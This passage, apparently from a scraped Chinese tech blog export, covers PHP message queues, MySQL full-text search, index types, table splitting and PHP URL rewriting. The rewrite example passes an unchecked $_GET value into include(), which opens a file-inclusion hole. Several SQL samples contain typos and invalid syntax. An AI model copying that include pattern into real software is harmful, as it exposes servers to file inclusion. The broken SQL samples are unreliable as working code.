msg_stat_queue ( resource $queue ) 这个函数会返回消息队列的元数据。消息队列元数据中的信息很完整，包括了消息队列中待读取的消息数、最后读写队列的进程ID等。示例代码在第8行调用该函数返回的数组中队列中待读取的消息数msg_qnum值为0。 1msg_receive ( resource $queue , int $desiredmsgtype , int &amp;$msgtype , int $maxsize , mixed &amp;$message [, bool$unserialize [, int $flags [, int &amp;$errorcode ]]] ) msg_receive用于读取消息队列中的数据。msg_remove_queue ( resource $queue ) msg_remove_queue用于销毁一个队列。示例代码_1只是展示了PHP操作消息队列函数的应用。下面的代码具体描述了进程间通信的场景 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?php $message_queue_key = ftok(__FILE__, &apos;a&apos;);$message_queue = msg_get_queue($message_queue_key, 0666); $pids = array();for ($i = 0; $i &lt; 5; $i++) &#123; //创建子进程 $pids[$i] = pcntl_fork(); if ($pids[$i]) &#123; echo &quot;No.$i child process was created, the pid is $pids[$i]\\r\\n&quot;; &#125; elseif ($pids[$i] == 0) &#123; $pid = posix_getpid(); echo &quot;process.$pid is writing now\\r\\n&quot;; msg_send($message_queue, 1, &quot;this is process.$pid&apos;s data\\r\\n&quot;); posix_kill($pid, SIGTERM); &#125;&#125; do &#123; msg_receive($message_queue, 0, $message_type, 1024, $message, true, MSG_IPC_NOWAIT); echo $message; //需要判断队列是否为空，如果为空就退出 //break;&#125; while(true) ?&gt;运行结果为：No.0 child process was created, the pid is 5249No.1 child process was created, the pid is 5250No.2 child process was created, the pid is 5251No.3 child process was created, the pid is 5252No.4 child process was created, the pid is 5253process.5251 is writing nowthis is process.5251&apos;s dataprocess.5253 is writing nowprocess.5252 is writing nowprocess.5250 is writing nowthis is process.5253&apos;s datathis is process.5252&apos;s datathis is process.5250&apos;s dataprocess.5249 is writing nowthis is process.5249&apos;s data 这段程序每次的运行结果都会不同，这正说明了多进程的异步性。从结果也能看出消息队列FIFO特性。 以上便是我研究的一点心得。接下来将会继续研究PHP利用信号、socket等进行进程间通信的方法。 转载自：http://www.cnblogs.com/fengwei/archive/2012/09/12/2682646.html","categories":[],"tags":[]},{"title":"MYSQL的FULLTEXT索引功能","slug":"mysql/MYSQL的FULLTEXT索引功能","date":"2013-01-06T03:12:16.000Z","updated":"2019-08-26T06:09:54.316Z","comments":true,"path":"2013/01/06/mysql/MYSQL的FULLTEXT索引功能/","link":"","permalink":"http://ningmo.github.io/2013/01/06/mysql/MYSQL的FULLTEXT索引功能/","excerpt":"","text":"下文转自某些手册，你可以用这个语句来创建FULLTEXT类型的索引： CREATE FULLTEXT INDEX INDX_TEXT ON ARTICLE (TITLE,NOTE); 到 3.23.23 时，MySQL 开始支持全文索引和搜索。全文索引在 MySQL 中是一个 FULLTEXT 类型索引。FULLTEXT 索引用于 MyISAM 表，可以在 CREATE TABLE 时或之后使用 ALTER TABLE 或 CREATE INDEX 在 CHAR、VARCHAR 或 TEXT 列上创建。对于大的数据库，将数据装载到一个没有 FULLTEXT 索引的表中，然后再使用 ALTER TABLE (或 CREATE INDEX) 创建索引，这将是非常快的。将数据装载到一个已经有 FULLTEXT 索引的表中，将是非常慢的。 全文搜索通过 MATCH() 函数完成。 mysql&gt; CREATE TABLE articles ( -&gt; id INT UNSIGNED AUTO_INCREMENT NOT NULL PRIMARY KEY, -&gt; title VARCHAR(200), -&gt; body TEXT, -&gt; FULLTEXT (title,body) -&gt; );Query OK, 0 rows affected (0.00 sec) mysql&gt; INSERT INTO articles VALUES -&gt; (NULL,’MySQL Tutorial’, ‘DBMS stands for DataBase …’), -&gt; (NULL,’How To Use MySQL Efficiently’, ‘After you went through a …’), -&gt; (NULL,’Optimising MySQL’,’In this tutorial we will show …’), -&gt; (NULL,’1001 MySQL Tricks’,’1. Never run mysqld as root. 2. …’), -&gt; (NULL,’MySQL vs. YourSQL’, ‘In the following database comparison …’), -&gt; (NULL,’MySQL Security’, ‘When configured properly, MySQL …’);Query OK, 6 rows affected (0.00 sec)Records: 6 Duplicates: 0 Warnings: 0 mysql&gt; SELECT * FROM articles -&gt; WHERE MATCH (title,body) AGAINST (‘database’);+—-+——————-+——————————————+| id | title | body |+—-+——————-+——————————————+| 5 | MySQL vs. YourSQL | In the following database comparison … || 1 | MySQL Tutorial | DBMS stands for DataBase … |+—-+——————-+——————————————+2 rows in set (0.00 sec)函数 MATCH() 对照一个文本集(包含在一个 FULLTEXT 索引中的一个或多个列的列集)执行一个自然语言搜索一个字符串。搜索字符串做为 AGAINST() 的参数被给定。搜索以忽略字母大小写的方式执行。对于表中的每个记录行，MATCH() 返回一个相关性值。即，在搜索字符串与记录行在 MATCH() 列表中指定的列的文本之间的相似性尺度。 当 MATCH() 被使用在一个 WHERE 子句中时 (参看上面的例子)，返回的记录行被自动地以相关性从高到底的次序排序。相关性值是非负的浮点数字。零相关性意味着不相似。相关性的计算是基于：词在记录行中的数目、在行中唯一词的数目、在集中词的全部数目和包含一个特殊词的文档(记录行)的数目。 它也可以执行一个逻辑模式的搜索。这在下面的章节中被描述。 前面的例子是函数 MATCH() 使用上的一些基本说明。记录行以相似性递减的顺序返回。 下一个示例显示如何检索一个明确的相似性值。如果即没有 WHERE 也没有 ORDER BY 子句，返回行是不排序的。 mysql&gt; SELECT id,MATCH (title,body) AGAINST (‘Tutorial’) FROM articles;+—-+—————————————–+| id | MATCH (title,body) AGAINST (‘Tutorial’) |+—-+—————————————–+| 1 | 0.64840710366884 || 2 | 0 || 3 | 0.66266459031789 || 4 | 0 || 5 | 0 || 6 | 0 |+—-+—————————————–+6 rows in set (0.00 sec)下面的示例更复杂一点。查询返回相似性并依然以相似度递减的次序返回记录行。为了完成这个结果，你应该指定 MATCH() 两次。这不会引起附加的开销，因为 MySQL 优化器会注意到两次同样的 MATCH() 调用，并只调用一次全文搜索代码。 mysql&gt; SELECT id, body, MATCH (title,body) AGAINST -&gt; (‘Security implications of running MySQL as root’) AS score -&gt; FROM articles WHERE MATCH (title,body) AGAINST -&gt; (‘Security implications of running MySQL as root’);+—-+————————————-+—————–+| id | body | score |+—-+————————————-+—————–+| 4 | 1. Never run mysqld as root. 2. … | 1.5055546709332 || 6 | When configured properly, MySQL … | 1.31140957288 |+—-+————————————-+—————–+2 rows in set (0.00 sec)MySQL 使用一个非常简单的剖析器来将文本分隔成词。一个“词”是由文字、数据、“’” 和 “_” 组成的任何字符序列。任何在 stopword 列表上出现的，或太短的(3 个字符或更少的)的 “word” 将被忽略。 在集和查询中的每个合适的词根据其在集与查询中的重要性衡量。这样，一个出现在多个文档中的词将有较低的权重(可能甚至有一个零权重)，因为在这个特定的 集中，它有较低的语义值。否则，如果词是较少的，它将得到一个较高的权重。然后，词的权重将被结合用于计算记录行的相似性。 这样一个技术工作可很好地工作与大的集(实际上，它会小心地与之谐调)。 对于非常小的表，词分类不足以充份地反应它们的语义值，有时这个模式可能产生奇怪的结果。 mysql&gt; SELECT * FROM articles WHERE MATCH (title,body) AGAINST (‘MySQL’);Empty set (0.00 sec)在上面的例子中，搜索词 MySQL 却没有得到任何结果，因为这个词在超过一半的记录行中出现。同样的，它被有效地处理为一个 stopword (即，一个零语义值的词)。这是最理想的行为 – 一个自然语言的查询不应该从一个 1GB 的表中返回每个次行(second row)。 匹配表中一半记录行的词很少可能找到相关文档。实际上，它可能会发现许多不相关的文档。我们都知道，当我们在互联网上通过搜索引擎试图搜索某些东西时，这会经常发生。因为这个原因，在这个特殊的数据集中，这样的行被设置一个低的语义值。 到 4.0.1 时，MySQL 也可以使用 IN BOOLEAN MODE 修饰语来执行一个逻辑全文搜索。 mysql&gt; SELECT * FROM articles WHERE MATCH (title,body) -&gt; AGAINST (‘+MySQL -YourSQL’ IN BOOLEAN MODE);+—-+——————————+————————————-+| id | title | body |+—-+——————————+————————————-+| 1 | MySQL Tutorial | DBMS stands for DataBase … || 2 | How To Use MySQL Efficiently | After you went through a … || 3 | Optimising MySQL | In this tutorial we will show … || 4 | 1001 MySQL Tricks | 1. Never run mysqld as root. 2. … || 6 | MySQL Security | When configured properly, MySQL … |+—-+——————————+————————————-+这个查询返回所有包含词 MySQL 的记录行(注意： 50% 的阈值没有使用)，但是它没有包含词 YourSQL。注意，一个逻辑模式的搜索不会自动地以相似值的降序排序记录行。你可以从上面的结果出看得出来，最高的相似值(包含 MySQL 两次的那个) 最列在最后，而不是第一位。一个逻辑全文搜索即使在没有一个 FULLTEXT 索引的情况下也可以工作，然而它 慢 些。 逻辑全文搜索支持下面的操作符： +一个领头的加号表示，该词必须出现在每个返回的记录行中。-一个领头的减号表示，该词必须不出现在每个返回的记录行中。 缺省的 (当既没有加号也没有负号被指定时)词是随意的，但是包含它的记录行将被排列地更高一点。这个模仿没有 IN BOOLEAN MODE 修饰词的 MATCH() … AGAINST() 的行为。&lt; &gt;这两个操作符用于改变一个词的相似性值的基值。&lt; 操作符减少基值，&gt; 操作符则增加它。参看下面的示例。( )圆括号用于对子表达式中的词分组。~一个领头的否定号的作用象一个否定操作符，引起行相似性的词的基值为负的。它对标记一个噪声词很有用。一个包含这样的词的记录将被排列得低一点，但是不会被完全的排除，因为这样可以使用 - 操作符。*一个星号是截断操作符。不想其它的操作符，它应该被追加到一个词后，不加在前面。“短语，被包围在双引号”中，只匹配包含这个短语(字面上的，就好像被键入的)的记录行。这里是一些示例： apple banana找至少包含上面词中的一个的记录行+apple +juice… 两个词均在被包含+apple macintosh… 包含词 “apple”，但是如果同时包含 “macintosh”，它的排列将更高一些+apple -macintosh… 包含 “apple” 但不包含 “macintosh”+apple +(&gt;pie &lt;strudel)… 包含 “apple” 和 “pie”，或者包含的是 “apple” 和 “strudel” (以任何次序)，但是 “apple pie” 排列得比 “apple strudel” 要高一点apple*… 包含 “apple”，“apples”，“applesauce” 和 “applet”“some words”… 可以包含 “some words of wisdom”，但不是 “some noise words”6.8.1 全文的限制 MATCH() 函数的所有参数必须是从来自于同一张表的列，同时必须是同一个FULLTEXT 索引中的一部分，除非 MATCH() 是 IN BOOLEAN MODE 的。MATCH() 列列表必须确切地匹配表的某一 FULLTEXT 索引中定义的列列表，除非 MATCH() 是 IN BOOLEAN MODE 的。AGAINST() 的参数必须是一个常量字符串。6.8.2 微调 MySQL 全文搜索 不幸地，全文搜索仍然只有很少的用户可调参数，虽然增加一些在 TODO 上排列很高。如果你有一个 MySQL 源码发行(查看章节 2.3 安装一个 MySQL 源码发行)，你可以发挥对全文搜索的更多控制。 注意，全文搜索为最佳的搜索效果，被仔细地调整了。修改默认值的行为，在大多数情况下，只会使搜索结果更糟。不要修改 MySQL 的源代码，除非你知道你在做什么！ 被索引的词的最小长度由 MySQL 变量 ft_min_word_len 指定。查看章节 4.5.6.4 SHOW VARIABLES。 将它改为你所希望的值，并重建你的 FULLTEXT 索引。 (这个变量只从 MySQL 4.0 开始被支持)stopword 列表可以从 ft_stopword_file 变量指定的文件中读取。查看章节 4.5.6.4 SHOW VARIABLES。 在修改了 stopword 列表后，重建你的 FULLTEXT 索引。(这个变量只从 MySQL 4.0.10 开始被支持)50% 阈值选择由所选择的特殊的衡量模式确定。为了禁止它，修改 `myisam/ftdefs.h’ 文件中下面的一行： #define GWS_IN_USE GWS_PROB改为： #define GWS_IN_USE GWS_FREQ然后重新编译 MySQL。在这种情况下，不需要重建索引。 注意：使用了这个，将严重地减少 MySQL 为 MATCH() 提供足够的相似性值的能力。如果你确实需要搜索这样的公共词，最好使用 IN BOOLEAN MODE 的搜索代替，它不遵守 50% 的阈值。有时，搜索引擎维护员希望更改使用于逻辑全文搜索的操作符。这些由变量 ft_boolean_syntax 定义。 查看章节 4.5.6.4 SHOW VARIABLES。 然而，这个变量是只读的，它的值在 `myisam/ft_static.c’ 中被设置。对于这些更改，要求你重建你的 FULLTEXT 索引，对于一个 MyISAM 表，最容易的重建索引文件的方式如下面的语句： mysql&gt; REPAIR TABLE tbl_name QUICK;6.8.3 全文搜索 TODO 使所有对 FULLTEXT 索引的操作更快邻近(Proximity)操作符对 “always-index words” 的支持。他们可以是用户希望视为一个词处理的任意字符串，例如 “C++”、”AS/400”、”TCP/IP”，等等支持在 MERGE 表中的全文搜索对多字节字符的支持依照数据的语言建立 stopword 列表Stemming (当然，依赖于数据的语言)Generic user-suppliable UDF preparser.使模式更加灵活 (通过为 CREATE/ALTER TABLE 中的 FULLTEXT 增加某些可调整参数)","categories":[],"tags":[]},{"title":"MySQL索引类型一览 让MySQL高效运行起来","slug":"mysql/MySQL索引类型一览 让MySQL高效运行起来","date":"2013-01-06T01:58:40.000Z","updated":"2019-08-26T06:09:54.317Z","comments":true,"path":"2013/01/06/mysql/MySQL索引类型一览 让MySQL高效运行起来/","link":"","permalink":"http://ningmo.github.io/2013/01/06/mysql/MySQL索引类型一览 让MySQL高效运行起来/","excerpt":"","text":"索引是快速搜索的关键。MySQL索引的建立对于MySQL的高效运行是很重要的。下面介绍几种常见的MySQL索引类型。 在数据库表中，对字段建立索引可以大大提高查询速度。假如我们创建了一个 mytable表： 1234567CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL ); 我们随机向里面插入了10000条记录，其中有一条：5555, admin。 在查找username=”admin”的记录 SELECT * FROM mytable WHERE username=’admin’;时，如果在username上已经建立了索引，MySQL无须任何扫描，即准确可找到该记录。相反，MySQL会扫描所有记录，即要查询10000条记录。 索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索包含多个列。 MySQL索引类型包括： （1）普通索引 这是最基本的索引，它没有任何限制。它有以下几种创建方式： ◆创建索引 CREATE INDEX indexName ON mytable(username(length));如果是CHAR，VARCHAR类型，length可以小于字段实际长度；如果是BLOB和TEXT类型，必须指定 length，下同。 ◆修改表结构 ALTER mytable ADD INDEX [indexName] ON (username(length))◆创建表的时候直接指定 123456789CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, INDEX [indexName] (username(length)) ); 删除索引的语法： 1DROP INDEX [indexName] ON mytable; （2）唯一索引 它与前面的普通索引类似，不同的就是：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。它有以下几种创建方式： ◆创建索引 1CREATE UNIQUE INDEX indexName ON mytable(username(length)) ◆修改表结构 1ALTER mytable ADD UNIQUE [indexName] ON (username(length)) ◆创建表的时候直接指定 123456789CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, UNIQUE [indexName] (username(length)) ); （3）主键索引 它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引： 123456789CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, PRIMARY KEY(ID) ); 当然也可以用 ALTER 命令。记住：一个表只能有一个主键。 （4）组合索引 为了形象地对比单列索引和组合索引，为表添加多个字段： 1234567891011CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, city VARCHAR(50) NOT NULL, age INT NOT NULL ); 为了进一步榨取MySQL的效率，就要考虑建立组合索引。就是将 name, city, age建到一个索引里： 1ALTER TABLE mytable ADD INDEX name_city_age (name(10),city,age); 建表时，usernname长度为 16，这里用 10。这是因为一般情况下名字的长度不会超过10，这样会加速索引查询速度，还会减少索引文件的大小，提高INSERT的更新速度。 如果分别在 usernname，city，age上建立单列索引，让该表有3个单列索引，查询时和上述的组合索引效率也会大不一样，远远低于我们的组合索引。虽然此时有了三个索引，但MySQL只能用到其中的那个它认为似乎是最有效率的单列索引。 建立这样的组合索引，其实是相当于分别建立了下面三组组合索引： usernname,city,age usernname,city usernname为什么没有 city，age这样的组合索引呢？这是因为MySQL组合索引“最左前缀”的结果。简单的理解就是只从最左面的开始组合。并不是只要包含这三列的查询都会用到该组合索引，下面的几个SQL就会用到这个组合索引： 12345678SELECT * FROM mytable WHREE username=&quot;admin&quot; AND city=&quot;郑州&quot; SELECT * FROM mytable WHREE username=&quot;admin&quot; 而下面几个则不会用到：SELECT * FROM mytable WHREE age=20 AND city=&quot;郑州&quot; SELECT * FROM mytable WHREE city=&quot;郑州&quot; （5）建立索引的时机 到这里我们已经学会了建立索引，那么我们需要在什么情况下建立索引呢？一般来说，在WHERE和JOIN中出现的列需要建立索引，但也不完全如此，因为MySQL只对&lt;，&lt;=，=，&gt;，&gt;=，BETWEEN，IN，以及某些时候的LIKE才会使用索引。例如： 12345SELECT t.Name FROM mytable t LEFT JOIN mytable m ON t.Name=m.username WHERE m.age=20 AND m.city=&apos;郑州&apos; 此时就需要对city和age建立索引，由于mytable表的userame也出现在了JOIN子句中，也有对它建立索引的必要。 刚才提到只有某些时候的LIKE才需建立索引。因为在以通配符%和_开头作查询时，MySQL不会使用索引。例如下句会使用索引： 1234SELECT * FROM mytable WHERE username like&apos;admin%&apos; 而下句就不会使用：SELECT * FROM mytable WHEREt Name like&apos;%admin&apos; 因此，在使用LIKE时应注意以上的区别。 （6）索引的不足之处 上面都在说使用索引的好处，但过多的使用索引将会造成滥用。因此索引也会有它的缺点： ◆虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。 ◆建立索引会占用磁盘空间的索引文件。一般情况这个问题不太严重，但如果你在一个大表上创建了多种组合索引，索引文件的会膨胀很快。 索引只是提高效率的一个因素，如果你的MySQL有大数据量的表，就需要花时间研究建立最优秀的索引，或优化查询语句。 （7）使用索引的注意事项 使用索引时，有以下一些技巧和注意事项： ◆索引不会包含有NULL值的列 只要列中包含有NULL值都将不会被包含在索引中，复合索引中只要有一列含有NULL值，那么这一列对于此复合索引就是无效的。所以我们在数据库设计时不要让字段的默认值为NULL。 ◆使用短索引 对串列进行索引，如果可能应该指定一个前缀长度。例如，如果有一个CHAR(255)的列，如果在前10个或20个字符内，多数值是惟一的，那么就不要对整个列进行索引。短索引不仅可以提高查询速度而且可以节省磁盘空间和I/O操作。 ◆索引列排序 MySQL查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。因此数据库默认排序可以符合要求的情况下不要使用排序操作；尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引。 ◆like语句操作 一般情况下不鼓励使用like操作，如果非使用不可，如何使用也是一个问题。like “%aaa%” 不会使用索引而like “aaa%”可以使用索引。 ◆不要在列上进行运算 1select * from users where YEAR(adddate)&lt;2007; 将在每个行上进行运算，这将导致索引失效而进行全表扫描，因此我们可以改成 1select * from users where adddate&lt;‘2007-01-01’; ◆不使用NOT IN和&lt;&gt;操作 以上，就对其中MySQL索引类型进行了介绍。","categories":[],"tags":[]},{"title":"mysql分表的3种方法","slug":"mysql/mysql分表的3种方法","date":"2013-01-04T09:26:16.000Z","updated":"2019-08-26T06:09:54.320Z","comments":true,"path":"2013/01/04/mysql/mysql分表的3种方法/","link":"","permalink":"http://ningmo.github.io/2013/01/04/mysql/mysql分表的3种方法/","excerpt":"","text":"一，先说一下为什么要分表当一张的数据达到几百万时，你查询一次所花的时间会变多，如果有联合查询的话，我想有可能会死在那儿了。分表的目的就在于此，减小数据库的负担，缩短查询时间。根据个人经验，mysql执行一个sql的过程如下：1,接收到sql;2,把sql放到排队队列中 ;3,执行sql;4,返回执行结果。在这个执行过程中最花时间在什么地方呢？第一，是排队等待的时间，第二，sql的执行时间。其实这二个是一回事，等待的同时，肯定有sql在执行。所以我们要缩短sql的执行时间。mysql中有一种机制是表锁定和行锁定，为什么要出现这种机制，是为了保证数据的完整性，我举个例子来说吧，如果有二个sql都要修改同一张表的同一条数据，这个时候怎么办呢，是不是二个sql都可以同时修改这条数据呢？很显然mysql对这种情况的处理是，一种是表锁定（myisam存储引擎），一个是行锁定（innodb存储引擎）。表锁定表示你们都不能对这张表进行操作，必须等我对表操作完才行。行锁定也一样，别的sql必须等我对这条数据操作完了，才能对这条数据进行操作。如果数据太多，一次执行的时间太长，等待的时间就越长，这也是我们为什么要分表的原因。二，分表1，做mysql集群，例如：利用mysql cluster ，mysql proxy，mysql replication，drdb等等有人会问mysql集群，根分表有什么关系吗？虽然它不是实际意义上的分表，但是它启到了分表的作用，做集群的意义是什么呢？为一个数据库减轻负担，说白了就是减少sql排队队列中的sql的数量，举个例子：有10个sql请求，如果放在一个数据库服务器的排队队列中，他要等很长时间，如果把这10个sql请求，分配到5个数据库服务器的排队队列中，一个数据库服务器的队列中只有2个，这样等待时间是不是大大的缩短了呢？这已经很明显了。所以我把它列到了分表的范围以内，我做过一些mysql的集群：linux mysql proxy 的安装，配置，以及读写分离mysql replication 互为主从的安装及配置，以及数据同步优点：扩展性好，没有多个分表后的复杂操作（php代码）缺点：单个表的数据量还是没有变，一次操作所花的时间还是那么多，硬件开销大。2，预先估计会出现大数据量并且访问频繁的表，将其分为若干个表这种预估大差不差的，论坛里面发表帖子的表，时间长了这张表肯定很大，几十万，几百万都有可能。 聊天室里面信息表，几十个人在一起一聊一个晚上，时间长了，这张表的数据肯定很大。像这样的情况很多。所以这种能预估出来的大数据量表，我们就事先分出个N个表，这个N是多少，根据实际情况而定。以聊天信息表为例：我事先建100个这样的表，message_00,message_01,message_02……….message_98,message_99.然后根据用户的ID来判断这个用户的聊天信息放到哪张表里面，你可以用hash的方式来获得，可以用求余的方式来获得，方法很多，各人想各人的吧。下面用hash的方法来获得表名：查看复制打印? 123456789101112131415&lt;?php function get_hash_table($table,$userid) &#123; $str = crc32($userid); if($str&lt;0)&#123; $hash = &quot;0&quot;.substr(abs($str), 0, 1); &#125;else&#123; $hash = substr($str, 0, 2); &#125; return $table.&quot;_&quot;.$hash; &#125; echo get_hash_table(&apos;message&apos;,&apos;user18991&apos;); //结果为message_10 echo get_hash_table(&apos;message&apos;,&apos;user34523&apos;); //结果为message_13 ?&gt; 说明一下，上面的这个方法，告诉我们user18991这个用户的消息都记录在message_10这张表里，user34523这个用户的消息都记录在message_13这张表里，读取的时候，只要从各自的表中读取就行了。优点：避免一张表出现几百万条数据，缩短了一条sql的执行时间缺点：当一种规则确定时，打破这条规则会很麻烦，上面的例子中我用的hash算法是crc32，如果我现在不想用这个算法了，改用md5后，会使同一个用户的消息被存储到不同的表中，这样数据乱套了。扩展性很差。3，利用merge存储引擎来实现分表我觉得这种方法比较适合，那些没有事先考虑，而已经出现了得，数据查询慢的情况。这个时候如果要把已有的大数据量表分开比较痛苦，最痛苦的事就是改代码，因为程序里面的sql语句已经写好了，现在一张表要分成几十张表，甚至上百张表，这样sql语句是不是要重写呢？举个例子，我很喜欢举子mysql&gt;show engines;的时候你会发现mrg_myisam其实就是merge。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051mysql&gt; CREATE TABLE IF NOT EXISTS `user1` ( -&gt; `id` int(11) NOT NULL AUTO_INCREMENT, -&gt; `name` varchar(50) DEFAULT NULL, -&gt; `sex` int(1) NOT NULL DEFAULT &apos;0&apos;, -&gt; PRIMARY KEY (`id`) -&gt; ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ; Query OK, 0 rows affected (0.05 sec) mysql&gt; CREATE TABLE IF NOT EXISTS `user2` ( -&gt; `id` int(11) NOT NULL AUTO_INCREMENT, -&gt; `name` varchar(50) DEFAULT NULL, -&gt; `sex` int(1) NOT NULL DEFAULT &apos;0&apos;, -&gt; PRIMARY KEY (`id`) -&gt; ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ; Query OK, 0 rows affected (0.01 sec) mysql&gt; INSERT INTO `user1` (`name`, `sex`) VALUES(&apos;张映&apos;, 0); Query OK, 1 row affected (0.00 sec) mysql&gt; INSERT INTO `user2` (`name`, `sex`) VALUES(&apos;tank&apos;, 1); Query OK, 1 row affected (0.00 sec) mysql&gt; CREATE TABLE IF NOT EXISTS `alluser` ( -&gt; `id` int(11) NOT NULL AUTO_INCREMENT, -&gt; `name` varchar(50) DEFAULT NULL, -&gt; `sex` int(1) NOT NULL DEFAULT &apos;0&apos;, -&gt; INDEX(id) -&gt; ) TYPE=MERGE UNION=(user1,user2) INSERT_METHOD=LAST AUTO_INCREMENT=1 ; Query OK, 0 rows affected, 1 warning (0.00 sec) mysql&gt; select id,name,sex from alluser; +----+--------+-----+ | id | name | sex | +----+--------+-----+ | 1 | 张映 | 0 | | 1 | tank | 1 | +----+--------+-----+ 2 rows in set (0.00 sec) mysql&gt; INSERT INTO `alluser` (`name`, `sex`) VALUES(&apos;tank2&apos;, 0); Query OK, 1 row affected (0.00 sec) mysql&gt; select id,name,sex from user2 -&gt; ; +----+-------+-----+ | id | name | sex | +----+-------+-----+ | 1 | tank | 1 | | 2 | tank2 | 0 | +----+-------+-----+ 2 rows in set (0.00 sec) 从上面的操作中，我不知道你有没有发现点什么？假如我有一张用户表user，有50W条数据，现在要拆成二张表user1和user2，每张表25W条数据， 12INSERT INTO user1(user1.id,user1.name,user1.sex)SELECT (user.id,user.name,user.sex)FROM user where user.id &lt;= 250000INSERT INTO user2(user2.id,user2.name,user2.sex)SELECT (user.id,user.name,user.sex)FROM user where user.id &gt; 250000 这样我就成功的将一张user表，分成了二个表，这个时候有一个问题，代码中的sql语句怎么办，以前是一张表，现在变成二张表了，代码改动很大，这样给程序员带来了很大的工作量，有没有好的办法解决这一点呢？办法是把以前的user表备份一下，然后删除掉，上面的操作中我建立了一个alluser表，只把这个alluser表的表名改成user就行了。但是，不是所有的mysql操作都能用的a，如果你使用 alter table 来把 merge 表变为其它表类型，到底层表的映射就被丢失了。取而代之的，来自底层 myisam 表的行被复制到已更换的表中，该表随后被指定新类型。b，网上看到一些说replace不起作用，我试了一下可以起作用的。晕一个先 12345678910111213mysql&gt; UPDATE alluser SET sex=REPLACE(sex, 0, 1) where id=2; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select * from alluser; +----+--------+-----+ | id | name | sex | +----+--------+-----+ | 1 | 张映 | 0 | | 1 | tank | 1 | | 2 | tank2 | 1 | +----+--------+-----+ 3 rows in set (0.00 sec) c，一个 merge 表不能在整个表上维持 unique 约束。当你执行一个 insert，数据进入第一个或者最后一个 myisam 表（取决于 insert_method 选项的值）。mysql 确保唯一键值在那个 myisam 表里保持唯一，但不是跨集合里所有的表。d,当你创建一个 merge 表之时，没有检查去确保底层表的存在以及有相同的机构。当 merge 表被使用之时，mysql 检查每个被映射的表的记录长度是否相等，但这并不十分可靠。如果你从不相似的 myisam 表创建一个 merge 表，你非常有可能撞见奇怪的问题。好困睡觉了，c和d在网上看到的，没有测试，大家试一下吧。优点：扩展性好，并且程序代码改动的不是很大缺点：这种方法的效果比第二种要差一点三，总结一下上面提到的三种方法，我实际做过二种，第一种和第二种。第三种没有做过，所以说的细一点。哈哈。做什么事都有一个度，超过个度就过变得很差，不能一味的做数据库服务器集群，硬件是要花钱买的，也不要一味的分表，分出来1000表，mysql的存储归根到底还以文件的形势存在硬盘上面，一张表对应三个文件，1000个分表就是对应3000个文件，这样检索起来也会变的很慢。我的建议是方法1和方法2结合的方式来进行分表方法1和方法3结合的方式来进行分表我的二个建议适合不同的情况，根据个人情况而定，我觉得会有很多人选择方法1和方法3结合的方式 转载自：http://blog.51yip.com/mysql/949.html","categories":[],"tags":[]},{"title":"php URL重写","slug":"php/php URL重写","date":"2012-12-18T15:19:30.000Z","updated":"2019-08-26T06:09:54.325Z","comments":true,"path":"2012/12/18/php/php URL重写/","link":"","permalink":"http://ningmo.github.io/2012/12/18/php/php URL重写/","excerpt":"","text":"话说重写：网站结构如下：index.phpsource/src_{模块名}.phptemplate/tpl_{模块名}.php通过首页统一入口来访问各个模块文件，比如，最简单的统一入口访问代码：define(‘ROOT’, dirname(FILE));$mod = isset($GET[‘mod’]) ? $_GET[‘mod’] : ‘index’;$src = ROOT . ‘source/src‘ . $mod . ‘.php’ ;$tpl = ROOT . ‘template/src_’ . $mod . ‘.php’ ;file_exists($src) &amp;&amp; include($src) ;file_exists($tpl) &amp;&amp; include($tpl) ;现在访问一个地址：index.php?mod=news ；则会访问source/src_news.php 文件。现在要让url重写，访问 /news 这个url能实现一样的效果,Linux下的Apache和Nginx，windows下的ISAPI_Rewrite模块重写，重写要求，如果我访问的是不存在的文件，重定向到index.php，通过获取实际访问的url，来判断该调用哪个文件，如果我访问 /news?page=1 这个URL，重定向后：三个服务器访问后的结果：Apache 关于开启rewrite模块后，会产生三个头部：$_SERVER[‘REDIRECT_STATUS’] =&gt; 200 （证明重写成功）$_SERVER[‘REDIRECT_QUERY_STRING’] =&gt; page=1$_SERVER[‘REDIRECT_URL’] =&gt; /news而IIS的rewrite模块重写后，会有$_SERVER[‘REDIRECT_STATUS’] =&gt; 200$_SERVER[‘HTTP_X_REWRITE_URL’] =&gt; /newsNginx重写后有：$_SERVER[‘REDIRECT_STATUS’] =&gt; 200所以，如果采用 $_SERVER[‘REDIRECT_URL’] 或 $_SERVER[‘HTTP_X_REWRITE_URL’]都是不可取的，因为Nginx重写后，不产生重写URL，三个服务器并没有交集，如果还考虑其他服务器比如 lighttpd，cheroke等，可能产生的头部更加不一致。通常需要考虑的就是PHP的 $_SERVER[‘REQUEST_URI’]现在看看这几个服务器产生的 REQUEST_URI是否一致：apache下：$_SERVER[‘REQUEST_URI’] =&gt; /newsNginx下：$_SERVER[‘REQUEST_URI’] =&gt; /newsIIS下：$_SERVER[‘REQUEST_URI’] =&gt; /index.php/news这他妈是怎么回事？干嘛加个/index.php这个玩意呢？我没有搞懂，不过IIS的重写不完全支持.htaccess语法，所以，不知道是否是我配置的问题，但是我绞尽脑汁也弄不掉这个/index.php所以，干脆用IIS专用的 $_SERVER[‘HTTP_X_REWRITE_URL’] 来替换 